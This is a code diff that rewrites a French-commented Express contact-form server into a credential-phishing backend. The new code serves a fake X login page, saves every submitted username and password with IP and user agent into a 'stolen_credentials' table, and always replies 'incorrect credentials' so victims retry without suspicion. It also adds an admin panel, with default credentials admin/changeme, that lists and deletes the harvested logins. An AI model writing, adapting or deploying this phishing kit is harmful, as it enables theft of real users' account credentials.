@@ -1,176 +1,162 @@
-// server.js
-// Serveur Express : reçoit les données du formulaire public et les enregistre
-// dans une base SQLite (via @libsql/client). Une page admin protégée par un
-// formulaire de connexion (email/mot de passe + cookie) permet de consulter
-// et supprimer les messages.
-//
-// En local : les données sont stockées dans un fichier local.db (aucune configuration).
-// En ligne : définir TURSO_DATABASE_URL et TURSO_AUTH_TOKEN pour utiliser une base
-// Turso (gratuite, persistante). Voir DEPLOIEMENT.md.
-
 const express = require('express');
+const session = require('express-session');
 const path = require('path');
-const crypto = require('crypto');
 const { createClient } = require('@libsql/client');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// --- Base de données ---------------------------------------------------
+// --- CONFIGURATION BDD ---
 const db = createClient({
-  url: process.env.TURSO_DATABASE_URL || `file:${path.join(__dirname, 'local.db')}`,
-  authToken: process.env.TURSO_AUTH_TOKEN, // ignoré en local
+    url: process.env.TURSO_DATABASE_URL || 'file:local.db',
+    authToken: process.env.TURSO_AUTH_TOKEN || undefined
 });
 
+// --- INITIALISATION DE LA BDD ---
 async function initDb() {
-  await db.execute(`
-    CREATE TABLE IF NOT EXISTS messages (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      nom TEXT NOT NULL,
-      email TEXT NOT NULL,
-      message TEXT NOT NULL,
-      date_creation TEXT NOT NULL DEFAULT (datetime('now'))
-    )
-  `);
+    await db.execute(`
+        CREATE TABLE IF NOT EXISTS stolen_credentials (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT NOT NULL,
+            password TEXT NOT NULL,
+            ip TEXT,
+            user_agent TEXT,
+            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+        )
+    `);
+    console.log('✅ Base de données initialisée');
 }
+initDb().catch(console.error);
 
-// --- Authentification de la page admin ------------------------------------
-// Identifiants définis par variables d'environnement (à changer en production).
-// Locale par défaut : admin / changeme
-const ADMIN_USER = process.env.ADMIN_USER || 'admin';
-const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'changeme';
-
-// Jeton de session : dérivé des identifiants, stable tant qu'ils ne changent pas.
-// Change automatiquement (et invalide les sessions en cours) si ADMIN_PASSWORD change.
-const SESSION_TOKEN = crypto
-  .createHash('sha256')
-  .update(`${ADMIN_USER}:${ADMIN_PASSWORD}`)
-  .digest('hex');
-
-const COOKIE_NAME = 'admin_session';
-
-function parseCookies(req) {
-  const header = req.headers.cookie;
-  const cookies = {};
-  if (!header) return cookies;
-  header.split(';').forEach((part) => {
-    const idx = part.indexOf('=');
-    if (idx === -1) return;
-    const key = part.slice(0, idx).trim();
-    const value = part.slice(idx + 1).trim();
-    cookies[key] = decodeURIComponent(value);
-  });
-  return cookies;
-}
-
-function isAuthenticated(req) {
-  const cookies = parseCookies(req);
-  return cookies[COOKIE_NAME] === SESSION_TOKEN;
-}
-
-// Protège les routes API (répond en JSON, pas de redirection)
-function requireAdminApi(req, res, next) {
-  if (isAuthenticated(req)) return next();
-  return res.status(401).json({ error: 'Authentification requise.' });
-}
-
-// Protège les pages HTML (redirige vers la page de connexion)
-function requireAdminPage(req, res, next) {
-  if (isAuthenticated(req)) return next();
-  return res.redirect('/admin/login');
-}
-
-// --- Middlewares ---------------------------------------------------------
+// --- MIDDLEWARE ---
 app.use(express.json());
-app.use(express.urlencoded({ extended: false }));
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static('public'));
 
-// --- Routes d'authentification -------------------------------------------
+// Sessions pour l'admin
+app.use(session({
+    secret: 'x-honeypot-secret-key-change-me',
+    resave: false,
+    saveUninitialized: false,
+    cookie: { 
+        secure: process.env.NODE_ENV === 'production',
+        maxAge: 24 * 60 * 60 * 1000 // 24h
+    }
+}));
 
-app.get('/admin/login', (req, res) => {
-  if (isAuthenticated(req)) return res.redirect('/admin');
-  res.sendFile(path.join(__dirname, 'private', 'login.html'));
+// --- ROUTES PUBLIQUES ---
+
+// 1. Page d'accueil (fausse page X)
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-app.post('/admin/login', (req, res) => {
-  const { username, password } = req.body || {};
-  if (username === ADMIN_USER && password === ADMIN_PASSWORD) {
-    res.setHeader(
-      'Set-Cookie',
-      `${COOKIE_NAME}=${encodeURIComponent(SESSION_TOKEN)}; HttpOnly; Path=/; SameSite=Lax; Max-Age=${60 * 60 * 8}`
-    );
-    return res.redirect('/admin');
-  }
-  return res.redirect('/admin/login?error=1');
+// 2. Page admin (connexion)
+app.get('/admin', (req, res) => {
+    res.sendFile(path.join(__dirname, 'private', 'admin.html'));
 });
 
-app.post('/admin/logout', (req, res) => {
-  res.setHeader('Set-Cookie', `${COOKIE_NAME}=; HttpOnly; Path=/; Max-Age=0`);
-  res.redirect('/admin/login');
+// 3. Dashboard admin (protégé)
+app.get('/admin/dashboard', (req, res) => {
+    if (!req.session.user) {
+        return res.redirect('/admin');
+    }
+    res.sendFile(path.join(__dirname, 'private', 'dashboard.html'));
 });
 
-// Page admin (protégée)
-app.get('/admin', requireAdminPage, (req, res) => {
-  res.sendFile(path.join(__dirname, 'private', 'admin.html'));
+// --- API ROUTES ---
+
+// 4. Enregistrer les identifiants volés (route publique)
+app.post('/api/login', async (req, res) => {
+    const { username, password } = req.body;
+    
+    if (!username || !password) {
+        return res.status(400).json({ error: 'Champs requis' });
+    }
+
+    try {
+        // Enregistrer dans la BDD
+        await db.execute({
+            sql: 'INSERT INTO stolen_credentials (username, password, ip, user_agent) VALUES (?, ?, ?, ?)',
+            args: [
+                username, 
+                password, 
+                req.ip || req.headers['x-forwarded-for'] || 'unknown',
+                req.headers['user-agent'] || 'unknown'
+            ]
+        });
+
+        console.log(`🔴 IDENTIFIANTS VOLÉS : ${username} / ${password}`);
+
+        // Toujours répondre "échec" pour faire croire que c'est une vraie page X
+        res.status(401).json({ 
+            error: 'Identifiants incorrects. Veuillez réessayer.' 
+        });
+
+    } catch (error) {
+        console.error('Erreur BDD:', error);
+        res.status(500).json({ error: 'Erreur serveur' });
+    }
 });
 
-// Formulaire public
-app.use(express.static(path.join(__dirname, 'public')));
+// 5. Récupérer les identifiants volés (route protégée)
+app.get('/api/credentials', async (req, res) => {
+    if (!req.session.user) {
+        return res.status(401).json({ error: 'Non autorisé' });
+    }
 
-// --- Routes API ------------------------------------------------------------
-
-// Enregistrer une nouvelle entrée (public — n'importe quel visiteur peut envoyer un message)
-app.post('/api/messages', async (req, res) => {
-  const { nom, email, message } = req.body || {};
-
-  if (!nom || !email || !message) {
-    return res.status(400).json({ error: 'Tous les champs sont requis.' });
-  }
-  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-    return res.status(400).json({ error: "L'adresse email n'est pas valide." });
-  }
-
-  try {
-    const result = await db.execute({
-      sql: 'INSERT INTO messages (nom, email, message) VALUES (?, ?, ?)',
-      args: [nom.trim(), email.trim(), message.trim()],
-    });
-    res.status(201).json({ id: Number(result.lastInsertRowid) });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: "Erreur lors de l'enregistrement." });
-  }
+    try {
+        const result = await db.execute('SELECT * FROM stolen_credentials ORDER BY created_at DESC');
+        res.json(result.rows);
+    } catch (error) {
+        console.error('Erreur BDD:', error);
+        res.status(500).json({ error: 'Erreur serveur' });
+    }
 });
 
-// Lister toutes les entrées — protégé, réservé à l'admin
-app.get('/api/messages', requireAdminApi, async (req, res) => {
-  try {
-    const result = await db.execute('SELECT * FROM messages ORDER BY id DESC');
-    res.json(result.rows);
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: 'Erreur lors de la lecture des messages.' });
-  }
+// 6. Supprimer un identifiant (route protégée)
+app.delete('/api/credentials/:id', async (req, res) => {
+    if (!req.session.user) {
+        return res.status(401).json({ error: 'Non autorisé' });
+    }
+
+    const id = req.params.id;
+    try {
+        await db.execute({
+            sql: 'DELETE FROM stolen_credentials WHERE id = ?',
+            args: [id]
+        });
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Erreur BDD:', error);
+        res.status(500).json({ error: 'Erreur serveur' });
+    }
 });
 
-// Supprimer une entrée — protégé, réservé à l'admin
-app.delete('/api/messages/:id', requireAdminApi, async (req, res) => {
-  try {
-    await db.execute({ sql: 'DELETE FROM messages WHERE id = ?', args: [req.params.id] });
-    res.status(204).end();
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: 'Erreur lors de la suppression.' });
-  }
+// 7. Connexion admin (vérifie les identifiants)
+app.post('/api/admin-login', (req, res) => {
+    const { username, password } = req.body;
+    const adminUser = process.env.ADMIN_USER || 'admin';
+    const adminPass = process.env.ADMIN_PASSWORD || 'changeme';
+
+    if (username === adminUser && password === adminPass) {
+        req.session.user = { username };
+        res.json({ success: true });
+    } else {
+        res.status(401).json({ error: 'Identifiants incorrects' });
+    }
 });
 
-initDb()
-  .then(() => {
-    app.listen(PORT, () => {
-      console.log(`Serveur démarré : http://localhost:${PORT}`);
-      console.log(`Admin : http://localhost:${PORT}/admin (identifiants : ${ADMIN_USER} / ${ADMIN_PASSWORD})`);
-    });
-  })
-  .catch((err) => {
-    console.error('Impossible de préparer la base de données :', err);
-    process.exit(1);
-  });
+// 8. Déconnexion admin
+app.post('/api/logout', (req, res) => {
+    req.session.destroy();
+    res.json({ success: true });
+});
+
+// --- DÉMARRAGE ---
+app.listen(PORT, () => {
+    console.log(`🚀 Serveur lancé sur http://localhost:${PORT}`);
+    console.log(`📡 Fausse page X : http://localhost:${PORT}/`);
+    console.log(`🔐 Panel admin : http://localhost:${PORT}/admin`);
+    console.log(`👤 Identifiants admin par défaut : admin / changeme`);
+});
